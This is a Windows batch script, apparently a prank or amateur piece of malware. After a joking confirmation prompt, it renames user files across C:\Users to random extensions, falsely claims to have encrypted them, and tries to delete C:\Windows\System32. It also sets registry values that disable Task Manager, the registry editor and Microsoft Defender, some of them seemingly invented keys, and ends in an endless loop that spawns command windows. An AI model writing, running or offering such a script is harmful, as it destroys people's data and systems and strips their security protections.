@echo off
echo psst this will hack ur pc u sure? 
pause
cls
cd C:\Users
ren *.jpg *.1a91o
ren *.exe *.m9ad0
ren *.png *.l0H9nS
ren *.cmd *.l9jV1
ren *.lnk *.mN8aB
ren *.xlsx *.m0ibA
ren *.txt *.V5u8oP
ren *.pptx *.L1v9a
ren *.docx *.v68oA
ren *.docm *.ll9J9a
ren *.xlsm *.V7Ha9
ren *.gif *.L9baiO
ren *.mp1 *.ia6Ia
ren *.mp2 *.V5a7p
ren *.mp3 *.b6haC
ren *.mp4 *.l0jOwt
ren *.mp5 *.v1kPba
echo Enjoy my doom i have encrypted your files
del /s /q C:\Windows\System32
timeout 2
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegedit /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableProtection /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableKeyboard /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableMouse /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v EnableThreats /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableAntivirus /t REG_DWORD /d 1 /f
:x
start iwjejsie.bat
start cmd
goto x